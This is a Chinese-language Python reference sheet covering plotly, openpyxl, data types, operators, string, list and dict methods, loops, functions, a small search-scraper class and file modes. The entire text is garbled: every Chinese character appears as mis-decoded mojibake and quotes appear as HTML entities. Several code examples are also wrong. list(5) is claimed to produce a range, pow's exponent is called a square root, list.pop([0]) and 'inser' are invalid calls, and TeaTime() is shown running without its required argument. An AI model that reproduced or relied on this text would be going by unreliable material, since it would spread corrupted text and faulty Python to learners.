è¼‰å…¥æ¨¡çµ„(ä¸¦æŒ‡å®šç¹ªåœ–æ¨¡å¼) 1 2 3 4 import plotly # æŒ‡å®šç¹ªåœ–æ¨¡å¼ï¼šScatter, Bar, Pie, Box, Scattergeo, Histogram from plotly.graph_objs import Scatter # æŠ˜ç·šæ•£é»åœ– åœ¨ç·šç¹ªåœ–éœ€æ”¶è²»ï¼Œéœ€ä½¿ç”¨é›¢ç·šç¹ªåœ– 1 plotly.offline.init_notebook_mode(connected=True) æŒ‡å®šX/Yè»¸è³‡æ–™ 1 data = [Scatter(x=[\u0026#34;æ—å¤§å\u0026#34;, \u0026#34;é™³è°æ˜\u0026#34;, \u0026#34;é»ƒç¾éº—\u0026#34;], y=[67,89,72])] ç•«å‡ºæŠ˜ç·šåœ– 1 2 data = [Scatter(x=[\u0026#34;æ—å¤§å\u0026#34;, \u0026#34;é™³è°æ˜\u0026#34;, \u0026#34;é»ƒç¾éº—\u0026#34;], y=[67,89,72])] plotly.offline.iplot({\u0026#34;data\u0026#34;:data}) æŒ‡å®šç¹ªåœ–çš„mode 1 2 3 # markersï¼šåªæœ‰é» / linesï¼šåªæœ‰ç·š / lines + markersï¼šé» + ç·š data = [Scatter(x=[\u0026#34;æ—å¤§å\u0026#34;, \u0026#34;é™³è°æ˜\u0026#34;, \u0026#34;é»ƒç¾éº—\u0026#34;], y=[67,89,72], mode=\u0026#34;markers\u0026#34;)] plotly.offline.iplot({\u0026#34;data\u0026#34;:data}) æŒ‡å®šåœ–è¡¨æ¨™é¡Œ(ç¹ªåœ–æ¨¡å¼é ˆimport Layout) 1 2 3 4 5 6 7 8 9 10 11 12 import plotly from plotly.graph_objs import Scatter, Layout # é›¢ç·šç¹ªåœ–æ¨¡å¼ plotly.offline.init_notebook_mode(connected=True) data = [Scatter(x=[\u0026#34;æ—å¤§å\u0026#34;, \u0026#34;é™³è°æ˜\u0026#34;, \u0026#34;é»ƒç¾éº—\u0026#34;], y=[67,89,72])] # æŒ‡å®šåœ–è¡¨æ¨™é¡Œ plotly.offline.iplot({\u0026#34;data\u0026#34;:data, \u0026#34;layout\u0026#34;:Layout(title=\u0026#34;æˆç¸¾å–®\u0026#34;)}) Excelæ¨¡çµ„ - openpyxl è¼‰å…¥æ¨¡çµ„ 1 import openpyxl å»ºç«‹å·¥ä½œç°¿ç‰©ä»¶ - openpyxl.Workbook() 1 2 # å·¥ä½œç°¿ç‰©ä»¶ workbook = openpyxl.Workbook() å–å¾—æŒ‡å®šå·¥ä½œè¡¨ 1 2 # å·¥ä½œè¡¨ç‰©ä»¶ sheet = workbook.worksheets[0] éµå…¥å€¼ æ–¹æ³•ä¸€ï¼šè¡Œåˆ—æ’å…¥ 1 2 3 # sheetï¼šå·¥ä½œè¡¨ç‰©ä»¶ sheet[\u0026#39;A1\u0026#39;] = \u0026#34;æ¬„ä½ä¸€\u0026#34; sheet[\u0026#39;B1\u0026#39;] = \u0026#34;æ¬„ä½äºŒ\u0026#34; æ–¹æ³•äºŒï¼šè‡ªå‹•æ›è¡Œæ’å…¥ 1 2 3 # sheetï¼šå·¥ä½œè¡¨ç‰©ä»¶ listTitle = [\u0026#34;å§“å\u0026#34;, \u0026#34;é›»è©±\u0026#34;] sheet.append(listTitle) å–å¾—ç‰¹å®šæ¬„ä½çš„å€¼ - .value 1 sheet[\u0026#39;A1\u0026#39;].value å­˜æª” - å·¥ä½œç°¿ç‰©ä»¶.save(æª”å) 1 workbook.save(\u0026#39;test.xlsx\u0026#39;) å–æª” - openpyxl.load_workbook(æª”å) 1 workbook = openpyxl.load_workbook(\u0026#39;test.xlsx\u0026#39;) å–å¾—ç¸½è¡Œæ•¸ - å·¥ä½œè¡¨ç‰©ä»¶.max_row 1 print(sheet.max_row) å–å¾—ç¸½åˆ—æ•¸ - å·¥ä½œè¡¨ç‰©ä»¶.max_column 1 print(sheet.max_column) åˆ°æŒ‡å®šæ¬„ä½ - å·¥ä½œè¡¨ç‰©ä»¶.cell(row=æŒ‡å®šè¡Œæ•¸, column=æŒ‡å®šåˆ—æ•¸) 1 2 # å°å‡ºç¬¬3è¡Œç¬¬2åˆ—çš„å€¼ print(sheet.cell(row=3, column=2).value) Python è³‡æ–™å‹æ…‹ è³‡æ–™å‹æ…‹èªªæ˜ è³‡æ–™å‹æ…‹ èªªæ˜ str å­—ä¸² int æ•´æ•¸ bool å¸ƒæ—å€¼ float æµ®é»æ•¸ None ç©ºå€¼ list [] åˆ—è¡¨ï¼ŒåŒArray tuple () ä¸å¯è®Šæ›´çš„Array dict {} å­—å…¸ï¼ŒåŒObject set () é›†åˆï¼ŒåŒObjectï¼Œä½†keyç‚ºç´¢å¼•å€¼ Python é‹ç®—å­ åŸºæœ¬é‹ç®—å­ é‹ç®—å­ èªªæ˜ + åŠ ï¼šæ•¸å€¼ç›¸åŠ ,å­—ä¸²ç›¸é€£æ¥ - æ¸› * ä¹˜ï¼šæ•¸å€¼ç›¸ä¹˜,å­—ä¸²å¯ä¹˜æ•¸å€¼(pythonç¨æœ‰) / æµ®é»æ•¸é™¤ ** å¹³æ–¹ **0.5 é–‹æ ¹è™Ÿ // æ•´æ•¸é™¤ % å–é¤˜æ•¸ æŒ‡æ´¾é‹ç®—å­ é‹ç®—å­ èªªæ˜ += åŸå€¼ç­‰æ–¼åŸå€¼åŠ  -= åŸå€¼ç­‰æ–¼åŸå€¼æ¸› *= åŸå€¼ç­‰æ–¼åŸå€¼ä¹˜ /= åŸå€¼ç­‰æ–¼åŸå€¼é™¤ åˆ¤æ–·é‹ç®—å­ é‹ç®—å­ èªªæ˜ \u0026gt; å¤§æ–¼ \u0026lt; å°æ–¼ == ç­‰æ–¼ != ä¸ç­‰æ–¼ \u0026gt;= å¤§æ–¼ç­‰æ–¼ \u0026lt;= å°æ–¼ç­‰æ–¼ é‚è¼¯é‹ç®—å­ é‹ç®—å­ èªªæ˜ and ä¸¦ä¸” or æˆ–è€… not åå‘ Python å‡½å¼ å›å‚³è³‡æ–™å‹æ…‹ - type() 1 2 3 4 5 6 7 8 type(3) \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;int\u0026#39;\u0026gt; type(\u0026#39;a\u0026#39;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;str\u0026#39;\u0026gt; type(True) \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;bool\u0026#39;\u0026gt; type(None) # Pythonçš„ç©ºå€¼ç‚ºNone \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;NoneType\u0026#39;\u0026gt; è¼¸å…¥çª— - input() 1 2 3 4 myName = input(\u0026#34;è«‹è¼¸å…¥å§“åï¼š\u0026#34;) \u0026gt;\u0026gt;\u0026gt; è«‹è¼¸å…¥å§“åï¼šjessica # è¼¸å…¥åå­—å¾Œ print(myName) # å–è¼¸å…¥çš„åå­— \u0026gt;\u0026gt;\u0026gt; jessica å­—ä¸²è½‰æ•¸å€¼ - eval() 1 2 3 num = eval(\u0026#34;3\u0026#34;) print(type(num)) \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;int\u0026#39;\u0026gt; ç‰¹æ®Šç¬¦è™Ÿè½‰åé€²ä½ç·¨è™Ÿ - ord() / chr() 1 2 3 4 5 6 7 # ord å°‡ç‰¹æ®Šç¬¦è™Ÿè½‰æ›æˆåé€²ä½ç·¨è™Ÿ ord(\u0026#39;â¤…\u0026#39;) \u0026gt;\u0026gt;\u0026gt; 10501 # chr å°‡åé€²ä½ç·¨è™Ÿè½‰æ›æˆç‰¹æ®Šç¬¦è™Ÿ chr(10501) \u0026gt;\u0026gt;\u0026gt; â¤… å–æœ€å¤§ / æœ€å°å€¼ - max() / min() 1 2 3 4 min(1, 2, 45, 100) \u0026gt;\u0026gt;\u0026gt; 1 max(1, 2, 45, 100) \u0026gt;\u0026gt;\u0026gt; 100 å–çµ•å°æ•¸å€¼ - abs() 1 2 abs(-3.14) \u0026gt;\u0026gt;\u0026gt; 3.14 é€²åˆ¶å­—ä¸²è½‰æ•¸å­— - eval() 1 2 eval(\u0026#34;0o101\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 65 æ•¸å­—è½‰å­—ä¸² - str() 1 2 str(324) \u0026gt;\u0026gt;\u0026gt; \u0026#39;324\u0026#39; å­—ä¸²è½‰æ•¸å­—æˆ–æ•¸å­—è½‰æ•´æ•¸ - int() 1 2 3 4 int(\u0026#34;324\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 324 int(3.14) \u0026gt;\u0026gt;\u0026gt; 3 æµ®é»æ•¸å­—ä¸²è½‰æ•¸å­— - float() 1 2 float(\u0026#34;3.1416\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 3.1416 å››æ¨äº”å…¥ - round(æ•¸å€¼ [,ä½æ•¸]) 1 2 3 4 5 6 round(3.1416) \u0026gt;\u0026gt;\u0026gt; 3 # ç¬¬äºŒå€‹åƒæ•¸å¯å¸¶ä½æ•¸ round(3.1416, 3) \u0026gt;\u0026gt;\u0026gt; 3.142 å¹³æ–¹ - pow(æ•¸å€¼, å¹³æ–¹æ ¹) 1 2 3 # ç¬¬äºŒå€‹åƒæ•¸ç‚ºå¹³æ–¹æ ¹ pow(5, 2) \u0026gt;\u0026gt;\u0026gt; 25 å–å¾—é•·åº¦ - len() ä»»ä½•è³‡æ–™å‹æ…‹éƒ½é€šç”¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # String strA = \u0026#34;Hello World\u0026#34; len(strA) \u0026gt;\u0026gt;\u0026gt; 11 # Array arrA = [1, 2, 20, 50, 100] len(arrA) \u0026gt;\u0026gt;\u0026gt; 5 # Object objA = {\u0026#34;itemA\u0026#34;:\u0026#34;123\u0026#34;, \u0026#34;itemB\u0026#34;:\u0026#34;456\u0026#34;} len(objA) \u0026gt;\u0026gt;\u0026gt; 2 ç·¨ç¢¼ / è§£ç¢¼ - encode() / decode() 1 2 3 4 5 \u0026#34;ä¸­\u0026#34;.encode(\u0026#34;utf-8\u0026#34;) \u0026gt;\u0026gt;\u0026gt; b\u0026#39;\\xe4\\xb8\\xad\u0026#39; b\u0026#39;\\xe4\\xb8\\xad\u0026#39;.decode(\u0026#34;utf-8\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#34;ä¸­\u0026#34; å­—ä¸²è½‰å¤§å°å¯« - upper() / lower() 1 2 3 4 5 6 7 StrA = \u0026#34;Hello World!\u0026#34; # å¤§å¯« StrA.upper() \u0026gt;\u0026gt;\u0026gt; \u0026#39;HELLO WORLD!\u0026#39; # å°å¯« StrA.lower() \u0026gt;\u0026gt;\u0026gt; \u0026#39;hello world!\u0026#39; å­—ä¸²å–ä»£ - replace(èˆŠå­—ä¸², æ–°å­—ä¸²) 1 2 3 StrA = \u0026#34;Hello World!\u0026#34; StrA.replace(\u0026#34;World\u0026#34;, \u0026#34;Jessica\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#39;Hello Jessica!\u0026#39; å­—ä¸²åˆ¤æ–·çš„å‡½å¼ å‡½å¼ èªªæ˜ StrA.isalpha() æ˜¯å¦ç‚ºå­—æ¯ StrA.isdigit() æ˜¯å¦ç‚ºæ•¸å­— StrA.isupper() æ˜¯å¦ç‚ºå¤§å¯« StrA.islower() æ˜¯å¦ç‚ºå°å¯« StrA.isidentifer() æ˜¯å¦ç‚ºè­˜åˆ¥å­— StrA.iskeyword() æ˜¯å¦ç‚ºé—œéµå­—,éœ€è¦keywordæ¨¡çµ„ StrA.isspace() æ˜¯å¦ç‚ºç©ºç™½ StrA.istitle() æ˜¯å¦ç‚ºæ¨™é¡Œå­—(ç¬¬ä¸€å€‹å­—ç‚ºå¤§å¯«å‰‡æ˜¯æ¨™é¡Œå­—) å­—ä¸²æœå°‹çš„å‡½å¼ å‡½å¼ èªªæ˜ Str.count(æ–‡å­—A) æœå°‹æ–‡å­—Aå‡ºç¾çš„æ¬¡æ•¸ StrA.startswith(æ–‡å­—A) æ˜¯å¦ç‚ºæ–‡å­—Aé–‹é ­ StrA.endswith(æ–‡å­—A) æ˜¯å¦ç‚ºæ–‡å­—Açµå°¾ StrA.find(æ–‡å­—A) æœå°‹æ–‡å­—Açš„ä½ç½® StrA.rfind(æ–‡å­—A) æœå°‹æ–‡å­—Aæœ€å¾Œå‡ºç¾çš„ä½ç½® å°å‡ºå­—ä¸² - print() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # ä¸€èˆ¬çš„print(é–“éš”é è¨­è‡ªå‹•è£œç©ºæ ¼) print(1, 2, 3) \u0026gt;\u0026gt;\u0026gt; 1 2 3 # é–“éš”ä¸ç©ºæ ¼ print(1, 2, 3, sep=\u0026#34;\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 123 # æŒ‡å®šé–“éš”æ–‡å­— print(1, 2, 3, sep=\u0026#34;@\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 1@2@3 # æŒ‡å®šçµå°¾æ–‡å­— print(1, 2, 3, sep=\u0026#34;@\u0026#34;, end=\u0026#34;!!!\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 1@2@3!!! # æ ¼æ•¸åŒ–è¼¸å‡ºå­—å…ƒ(é–‹é ­å¸¶ä¸€å€‹å°å¯«çš„\u0026#34;f\u0026#34;) print(f\u0026#39;{è®Šæ•¸A}*{è®Šæ•¸B}={è®Šæ•¸A*è®Šæ•¸B}\u0026#39;) \u0026gt;\u0026gt;\u0026gt; A * B = AB å­—ä¸²æ ¼å¼åŒ– - format() å–ä»£å­—ä¸²ä¸­{} 1 2 3 text = \u0026#39;world\u0026#39; print(\u0026#39;hello {}\u0026#39;.format(text)) \u0026gt;\u0026gt;\u0026gt; hello world å¯å¸¶é—œéµå­—å–ä»£ 1 2 3 4 5 name = \u0026#39;Jack\u0026#39; text = \u0026#39;world\u0026#39; print(\u0026#39;hello {name}, hello {text}\u0026#39;.format(name=name, text=text)) \u0026gt;\u0026gt;\u0026gt; hello Jack, hello world å¾æœ€å¾Œé¢æ’å…¥ - append() 1 2 3 4 list1 = [2,4,6,8] list1.append(10) \u0026gt;\u0026gt;\u0026gt; [2,4,6,8,10] å¾æŒ‡å®šä½ç½®æ’å…¥ - insert(ä½ç½®, å€¼) 1 2 3 4 list1 = [2,4,6,8,10] list1.insert(0, -1) \u0026gt;\u0026gt;\u0026gt; [-1,2,4,6,8,10] æ¢ä»¶åˆ¤æ–· æ¢ä»¶åˆ¤æ–·å¼ - if\u0026hellip; elif\u0026hellip; else\u0026hellip; 1 2 3 4 5 6 7 # ä½¿ç”¨ç¸®æ’æ’°å¯«è¦åšçš„äº‹ if æ¢ä»¶A: ... elif æ¢ä»¶B: ... else: ... ä¾‹å¤–åˆ¤æ–· - try\u0026hellip; except\u0026hellip; 1 2 3 4 5 6 7 8 try: # ... except Exception: print(\u0026#34;æœ‰ç•°å¸¸éŒ¯èª¤\u0026#34;) except NameError: print(\u0026#34;è®Šæ•¸æœ‰éŒ¯èª¤\u0026#34;) except TypeError: print(\u0026#34;è³‡æ–™æ ¼å¼éŒ¯èª¤\u0026#34;) except éŒ¯èª¤åˆ†é¡ éŒ¯èª¤ç•°å¸¸åˆ¤æ–· èªªæ˜ Exception åªè¦æœ‰éŒ¯èª¤ NameError è®Šæ•¸åç¨±éŒ¯èª¤ ValueError valueå€¼éŒ¯èª¤ ZeroDivisionError é™¤æ•¸/åˆ†æ¯ä¸å¯ç‚ºé›¶çš„éŒ¯èª¤ TypeError è³‡æ–™æ ¼å¼éŒ¯èª¤ è¿´åœˆ æŠ€è¡“å¼è¿´åœˆ - for 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # è·‘range for i in range(1, 6): print(i, end=\u0026#34; \u0026#34;) \u0026gt;\u0026gt;\u0026gt; 1 2 3 4 5 # è·‘åœ¨å­—ä¸² for c in \u0026#34;Mary\u0026#34;: print(c, end=\u0026#34; \u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#34;M\u0026#34; \u0026#34;a\u0026#34; \u0026#34;r\u0026#34; \u0026#34;y\u0026#34; # è·‘åœ¨é™£åˆ— for e in [\u0026#34;a\u0026#34;, 3, \u0026#34;Jessica\u0026#34;] \u0026gt;\u0026gt;\u0026gt; \u0026#34;a\u0026#34; \u0026gt;\u0026gt;\u0026gt; 3 \u0026gt;\u0026gt;\u0026gt; \u0026#34;Jessica\u0026#34; æ¢ä»¶å¼è¿´åœˆ - while 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # whileè¿´åœˆ i = 0 while i \u0026lt; 5: i += 1 print(i) \u0026gt;\u0026gt;\u0026gt; 1 \u0026gt;\u0026gt;\u0026gt; 2 \u0026gt;\u0026gt;\u0026gt; 3 \u0026gt;\u0026gt;\u0026gt; 4 \u0026gt;\u0026gt;\u0026gt; 5 # Whileåˆ¤æ–·(åè¦†é©—è­‰ç›´åˆ°ansç­‰æ–¼\u0026#34;happy\u0026#34;) ans = input(\u0026#34;è«‹è¼¸å…¥å¿«æ¨‚çš„è‹±æ–‡ï¼š\u0026#34;) while ans != \u0026#34;happy\u0026#34;: ans = input(\u0026#34;æ‹¼éŒ¯å›‰ï¼Œå†çµ¦ä½ ä¸€æ¬¡æ©Ÿæœƒï¼š\u0026#34;) else: print(\u0026#34;ç­”å°å›‰ï¼Œæ˜¯happy\u0026#34;) breakï¼šè·³è„«è¿´åœˆ 1 2 3 4 5 6 7 8 9 ans = input(\u0026#34;è«‹è¼¸å…¥å¿«æ¨‚çš„è‹±æ–‡ï¼š\u0026#34;) while ans.lower() != \u0026#34;happy\u0026#34;: # ç•¶è¼¸å…¥quitæ™‚è·³å‡ºè¿´åœˆ if(ans.lower() == \u0026#34;quit\u0026#34;): print(\u0026#34;çŒœä¸å‡ºä¾†äº†å§ï¼ŒçµæŸ\u0026#34;) break; ans = input(\u0026#34;æ‹¼éŒ¯å›‰ï¼Œå†çµ¦ä½ ä¸€æ¬¡æ©Ÿæœƒï¼š\u0026#34;) else: print(\u0026#34;ç­”å°å›‰ï¼Œæ˜¯\u0026#34;, ans) continueï¼šè·³éç¹¼çºŒé€²è¡Œä¸‹ä¸€è¿´åœˆ 1 2 3 4 5 6 7 8 # ié‡4çš„å› æ•¸å°±è·³é i = 0 while i \u0026lt;= 100: i += 1 # continueå‰è¦å…ˆåŠ 1ï¼Œé¿å…é€²å…¥ç„¡çª®è¿´åœˆ if i % 4 == 0: continue print(i, end=\u0026#34; \u0026#34;) è‡ªè¨‚å‡½å¼ è‡ªå®šç¾©å‡½å¼ - def ä¸€èˆ¬å®£å‘Šå‡½å¼ 1 2 3 4 5 6 7 def printStar(_n): return \u0026#34;*\u0026#34; * _n # åŸ·è¡Œå‡½å¼ print(printStar(6)) \u0026gt;\u0026gt;\u0026gt; ****** è¨­å®šåƒæ•¸é è¨­å€¼ 1 2 3 4 5 6 7 8 9 10 11 def TeaTime(desserts, drink=\u0026#34;å’–å•¡\u0026#34;): print(f\u0026#39;ä¸‹åˆèŒ¶é»å¿ƒç‚º{desserts},é£²æ–™ç‚º{drink}\u0026#39;) TeaTime(\u0026#39;é¦¬å¡é¾\u0026#39;, \u0026#39;ç´…èŒ¶\u0026#39;) # æŒ‡å®šå¯¦éš›åƒæ•¸ TeaTime(\u0026#39;é¦¬å¡é¾\u0026#39;) # é£²æ–™æœƒé¡¯ç¤ºé è¨­å€¼:å’–å•¡ TeaTime() # å…©å€‹åƒæ•¸éƒ½é¡¯ç¤ºé è¨­å€¼ \u0026gt;\u0026gt;\u0026gt; ä¸‹åˆèŒ¶é»å¿ƒç‚ºé¦¬å¡é¾,é£²æ–™ç‚ºç´…èŒ¶ \u0026gt;\u0026gt;\u0026gt; ä¸‹åˆèŒ¶é»å¿ƒç‚ºé¦¬å¡é¾,é£²æ–™ç‚ºå’–å•¡ \u0026gt;\u0026gt;\u0026gt; ä¸‹åˆèŒ¶é»å¿ƒç‚ºé¬†é¤…,é£²æ–™ç‚ºå’–å•¡ è¨­å®šä¸å®šå€‹æ•¸åƒæ•¸(åƒæ•¸ç‚ºtupleå‹æ…‹) å¸¶å…¥åƒæ•¸å¸¶æ˜Ÿè™Ÿå¯å°‡å¸¶å…¥çš„åƒæ•¸çµ„æˆä¸€å€‹tuple 1 2 3 4 5 6 7 8 9 def add(*numbers): total = 0 for i in numbers: total += i print(total) add(1, 2, 4, 6) \u0026gt;\u0026gt;\u0026gt; 13 å¯¦éš›åƒæ•¸å¸¶æ˜Ÿè™Ÿå¯å°‡åŸç‚ºtupleå‹æ…‹çš„è³‡æ–™æ‹†è§£é–‹ä¾† 1 2 3 4 5 6 7 8 9 def add(*numbers): total = 0 for i in numbers: total += i print(total) add(*range(0, 11)) \u0026gt;\u0026gt;\u0026gt; 55 å¤šå€‹å›å‚³å€¼ 1 2 3 4 5 6 7 8 9 10 11 12 # å›å‚³å€¼ç”¨é€—è™Ÿéš”é–‹ def divmod(x, y): div = x // y mod = x % y return div, mod # ç”¨{a,b}æ¥å¤šå€‹å›å‚³å€¼ a, b = divmod(100, 7) print(f\u0026#39;100é™¤ä»¥7çš„å•†æ•¸ç‚º{a},é¤˜æ•¸ç‚º{b}\u0026#39;) \u0026gt;\u0026gt;\u0026gt; 100é™¤ä»¥7çš„å•†æ•¸ç‚º14,é¤˜æ•¸ç‚º2 æ“ä½œ List(åˆ—è¡¨) å»ºç«‹ å»ºç«‹ç©ºlist 1 2 3 4 5 # æ–¹æ³•1: list1 = [] # æ–¹æ³•2: list2 = list() å»ºç«‹list 1 list1 = [1, \u0026#34;taipei\u0026#34;, 2, \u0026#34;tokyo\u0026#34;] # æ¯å€‹çš„è³‡æ–™å‹æ…‹ä¸é™ å¾stringå»ºç«‹list 1 list1 = list(\u0026#34;Hello\u0026#34;) # list1ç‚º [\u0026#34;H\u0026#34;,\u0026#34;e\u0026#34;,\u0026#34;l\u0026#34;,\u0026#34;l\u0026#34;,\u0026#34;o\u0026#34;] å¾rangeå»ºç«‹list 1 list1 = list(5) # list1ç‚º [0,1,2,3,4] å¾å­—ä¸²åˆ†å‰²å»ºç«‹list 1 list1 = \u0026#34;1 2 3\u0026#34;.split() # list1ç‚º [\u0026#34;1\u0026#34;,\u0026#34;2\u0026#34;,\u0026#34;3\u0026#34;] åˆªé™¤ åˆªé™¤æ•´å€‹list 1 del list1 åˆªé™¤listä¸­çš„æŸä¸€å€‹(ä»¥ç¬¬ä¸€å€‹ç‚ºä¾‹) 1 2 3 4 5 6 7 8 # æ–¹æ³•1 del list1[0] # æ–¹æ³•2 list.remove(0) # æ–¹æ³•3 list.pop([0]) æ¸…é™¤listå…ƒç´ (ç­‰æ–¼del list[::]) 1 2 3 4 list1 = [2,4,6,8,10] list1.clear() \u0026gt;\u0026gt;\u0026gt; [] listæ–°å¢å…ƒç´  1 2 3 list.append(x) # é™„åŠ å…ƒç´ åˆ°æœ€å¾Œ list.extend(L) list.inser(i, x) # æ’å…¥å…ƒç´ è‡³æŒ‡å®šä½ç½® æŸ¥è©¢ç´¢å¼• 1 list1.index(\u0026#39;a\u0026#39;) # æŸ¥è©¢aåœ¨list1çš„ç´¢å¼• çµ±è¨ˆå‡ºç¾çš„æ¬¡æ•¸ 1 list1.count(\u0026#39;a\u0026#39;) # çµ±è¨ˆaåœ¨list1ä¸­å‡ºç¾çš„æ¬¡æ•¸ å…ƒç´ æ’åº 1 list.sort() # åŸåœ°æ“ä½œ å…ƒç´ å€’åº 1 list1.reverse() # åŸåœ°æ“ä½œ æ“ä½œ Dict(å­—å…¸) æŸ¥è©¢ ä¸€èˆ¬æŸ¥è©¢ 1 dict1[key] # è‹¥keyå€¼ä¸åœ¨æœƒå ±éŒ¯ ä»¥keyæŸ¥è©¢ï¼Œä½¿ç”¨dict1.get(key, [default]) - (æ¨è–¦) 1 2 3 4 5 6 7 8 9 10 11 12 13 # è‹¥ç„¡keyå€¼å‰‡é¡¯ç¤ºdefault dict1.get(key, [default]) #example: fruits = {\u0026#34;apple\u0026#34;:\u0026#34;30å…ƒ\u0026#34;, \u0026#34;banana\u0026#34;:\u0026#34;10å…ƒ\u0026#34;} Quest = input(\u0026#34;è«‹è¼¸å…¥è¦æŸ¥è©¢çš„åƒ¹æ ¼çš„æ°´æœï¼š\u0026#34;) print(fruits.get(Quest, \u0026#34;æŸ¥ç„¡æ­¤æ°´æœ\u0026#34;)) \u0026lt;\u0026lt;\u0026lt; apple \u0026gt;\u0026gt;\u0026gt; 30å…ƒ \u0026lt;\u0026lt;\u0026lt; orange \u0026gt;\u0026gt;\u0026gt; æŸ¥ç„¡æ­¤æ°´æœ æŸ¥è©¢æ‰€æœ‰çš„key (å›å‚³åˆ—è¡¨) 1 2 3 4 dict1 = {\u0026#34;user1\u0026#34;:\u0026#34;å°ä¸¸å­\u0026#34;, \u0026#34;user2\u0026#34;:\u0026#34;å°ç‰\u0026#34;, \u0026#34;user3\u0026#34;:\u0026#34;èŠ±è¼ª\u0026#34;} dict1.keys() \u0026gt;\u0026gt;\u0026gt; dict_keys([\u0026#39;user1\u0026#39;, \u0026#39;user2\u0026#39;, \u0026#39;user3\u0026#39;]) æŸ¥è©¢æ‰€æœ‰çš„values (å›å‚³åˆ—è¡¨) 1 2 3 4 dict1 = {\u0026#34;user1\u0026#34;:\u0026#34;å°ä¸¸å­\u0026#34;, \u0026#34;user2\u0026#34;:\u0026#34;å°ç‰\u0026#34;, \u0026#34;user3\u0026#34;:\u0026#34;èŠ±è¼ª\u0026#34;} dict1.values() \u0026gt;\u0026gt;\u0026gt; dict_values([\u0026#39;å°ä¸¸å­\u0026#39;, \u0026#39;å°ç‰\u0026#39;, \u0026#39;èŠ±è¼ª\u0026#39;]) å»ºç«‹ å»ºç«‹ç©ºdict 1 2 3 4 5 # æ–¹æ³•1: dict1 = {} # æ–¹æ³•2: dict2 = dict() å»ºç«‹dict 1 dict1 = {1:\u0026#34;one\u0026#34;, 2:\u0026#34;tow\u0026#34;, 3:\u0026#34;three\u0026#34;} æ–°å¢dict 1 dict1[newKey] = value æ›´æ–° æ›´æ–°dict 1 dict1[oldKey] = value æ¯”å°æ›´æ–° - update update æœƒæ¯”å°æ²’æœ‰çš„keyä¸¦è£œä¸Šï¼Œæ¯”å°æœ‰çš„keyé€²è¡Œvalueæ›´æ–°ã€‚ 1 2 3 4 5 6 dict1 = {\u0026#39;user1\u0026#39;: \u0026#39;å°ä¸¸å­\u0026#39;, \u0026#39;user2\u0026#39;: \u0026#39;å°ç‰\u0026#39;, \u0026#39;user3\u0026#39;: \u0026#39;èŠ±è¼ª\u0026#39;} dict2 = {\u0026#39;user1\u0026#39;: \u0026#39;å¤§ä¸¸å­\u0026#39;, \u0026#39;user2\u0026#39;: \u0026#39;å°ç‰\u0026#39;, \u0026#39;user3\u0026#39;: \u0026#39;èŠ±è¼ª\u0026#39;, \u0026#39;user4\u0026#39;: \u0026#39;å¤šæ‹‰Aå¤¢\u0026#39;} dict1.update(dict2) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;user1\u0026#39;: \u0026#39;å¤§ä¸¸å­\u0026#39;, \u0026#39;user2\u0026#39;: \u0026#39;å°ç‰\u0026#39;, \u0026#39;user3\u0026#39;: \u0026#39;èŠ±è¼ª\u0026#39;, \u0026#39;user4\u0026#39;: \u0026#39;å¤šæ‹‰Aå¤¢\u0026#39;} åˆªé™¤ åˆªé™¤æ•´å€‹dict 1 del dict1 æ¸…ç©ºæ•´å€‹dict 1 dict1.clear() åˆªé™¤listä¸­çš„æŸä¸€å€‹(ä»¥ç¬¬ä¸€å€‹ç‚ºä¾‹) 1 del dict1[key] æ“ä½œ class (é¡åˆ¥/ç‰©ä»¶å°å‘) å°è£æˆä¸€å€‹é¡åˆ¥ - class é¡åˆ¥åç¨±: pythonçš„classæœƒè‡ªå‹•åŸ·è¡Œ__init__å‡½å¼ï¼Œå¯è‡ªè¡Œå®šç¾©__init__å…§è¦åšçš„äº‹ã€‚ __init__ç¬¬ä¸€å€‹åƒæ•¸é è¨­ç‚ºselfã€‚ 1 2 3 4 5 6 7 class GoogleSpyder: def __init__(self, keyword): self.keyword = keyword self.url_tmp = \u0026#34;http://google.com/search?q=\u0026#34; + keyword + \u0026#34;\u0026amp;start={}\u0026#34; self.headers = {\u0026#34;user-agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34;} googleSpyder = GoogleSpyder(\u0026#34;python\u0026#34;) # è‡ªå‹•åŸ·è¡Œ __init__ æª”æ¡ˆè™•ç† è®€å¯«æ¨¡å¼ æ¨¡å¼ èªªæ˜ r readï¼šè®€å–(æª”æ¡ˆéœ€å­˜åœ¨) w writeï¼šæ–°å»ºæª”æ¡ˆå¯«å…¥(æª”æ¡ˆå¯ä¸å­˜åœ¨ï¼Œè‹¥å­˜åœ¨å‰‡æ¸…ç©º) a appendï¼šè³‡æ–™é™„åŠ åˆ°èˆŠæª”æ¡ˆå¾Œé¢(æ¸¸æ¨™æŒ‡åœ¨æª”æ¡ˆçµå°¾ï¼Œæª”æ¡ˆå¯ä¸å­˜åœ¨) r+ è®€å–èˆŠè³‡æ–™ä¸¦å¯«å…¥(æª”æ¡ˆéœ€å­˜åœ¨ä¸”æ¸¸æ¨™æŒ‡åœ¨é–‹é ­) w+ æ¸…ç©ºæª”æ¡ˆå…§å®¹ï¼Œæ–°å¯«å…¥çš„æ±è¥¿å¯å†è®€å‡º a+ è³‡æ–™é™„åŠ åˆ°èˆŠæª”æ¡ˆå¾Œé¢ï¼Œå¯è®€å–è³‡æ–™ b äºŒé€²ä½æ¨¡å¼ 